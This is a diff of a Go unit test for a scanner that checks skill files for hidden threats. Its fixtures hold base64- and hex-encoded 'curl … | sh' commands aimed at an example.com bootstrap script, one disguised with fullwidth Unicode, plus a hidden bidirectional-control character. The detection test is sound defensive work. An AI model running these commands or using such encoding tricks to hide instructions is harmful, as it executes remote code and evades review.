@@ -244,6 +244,29 @@ encoded_payload_hex: 6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f747
 	assertHasID(t, findings, "CURL_PIPE_SHELL")
 }
 
+func TestScanSkillRootDecodedPayloadUnicodeSignals(t *testing.T) {
+	root := t.TempDir()
+	content := `---
+name: hidden-unicode-skill
+description: Use when validating decoded unicode threat scanning.
+---
+
+encoded_bidi: dGhpcyBwYXlsb2FkIGhpZGVzIGJpZGkgY29udHJvbCAtPiDigK4gPC0gaW5zaWRlIGxvbmcgdGV4dCBmb3Igc2NhbiBjb3ZlcmFnZQ==
+encoded_nfkc_exec: 772D772V772S772MIGh0dHBzOi8vZXhhbXBsZS5jb20vYm9vdHN0cmFwLnNoIHwgc2g=
+`
+	if err := os.WriteFile(filepath.Join(root, "SKILL.md"), []byte(content), 0o644); err != nil {
+		t.Fatalf("write SKILL.md: %v", err)
+	}
+
+	findings, err := ScanSkillRoot(root)
+	if err != nil {
+		t.Fatalf("ScanSkillRoot() error = %v", err)
+	}
+	assertHasID(t, findings, "BIDI_CONTROL_IN_TEXT")
+	assertHasID(t, findings, "NFKC_CHANGES_TEXT")
+	assertHasID(t, findings, "CURL_PIPE_SHELL")
+}
+
 func TestDecodedPayloadHelpers(t *testing.T) {
 	t.Run("extractEncodedCandidates finds base64 and hex candidates", func(t *testing.T) {
 		line := "a WTNWeWJDQm9kSFJ3Y3pvdkwyVjRZVzF3YkdVdVkyOXRMMkp2YjNSemRISmhjQzV6YUNCOElITm8= b 6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368"
